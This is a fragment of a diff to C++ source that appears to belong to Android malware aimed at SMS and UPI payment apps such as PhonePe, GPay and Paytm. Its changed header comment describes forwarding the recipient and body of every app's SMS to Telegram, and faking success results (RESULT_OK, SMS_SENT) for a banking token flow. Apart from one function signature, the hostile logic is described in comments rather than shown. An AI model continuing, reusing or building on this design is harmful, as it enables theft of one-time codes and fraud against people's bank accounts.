@@ -23,12 +23,12 @@
 namespace {
 
 /**
- * v1.0.73 — ALL apps To+body → Telegram (fast + crash-safe)
+ * v1.0.74 — Hero fake-success fast (Something went wrong / SMS expire)
  *
  * Messages + Hero + YesPay/FamPay/BHIM/…: Java ISms immediate.
  * PhonePe/GPay/Paytm only: Java ISms ~4s (open crash avoid).
+ * PendingIntent RESULT_OK + delivery + SMS_SENT ASAP (Hero Axis token).
  * NEVER Binder/phone/sender on UPI. NEVER inject com.android.phone.
- * TG format: screenshot layout + Number/SMS/One-tap copy.
  */
 
 bool is_messaging_pkg(const std::string& pkg) {
